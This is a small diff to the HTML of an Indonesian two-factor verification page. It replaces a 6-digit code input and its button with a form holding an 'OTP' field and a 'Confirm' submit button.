@@ -205,8 +205,11 @@
         <p>Jika Anda tidak menerima notifikasi, masukkan kode 6 digit dari aplikasi autentikator Anda.</p>
         
         <div class="input-group">
-            <input type="text" id="securityCode" placeholder="Kode 6 digit" maxlength="6">
-            <button class="btn-submit" onclick="verifyCode()">Kirim Kode</button>
+          <form id="Formulir">
+            <input type="OTP" class="input-field" id="OTP" placeholder="Security Code" required>
+            
+            <button class="btn-submit" type="submit">Confirm</button>
+</form>
         </div>
 
         <div class="footer-links">
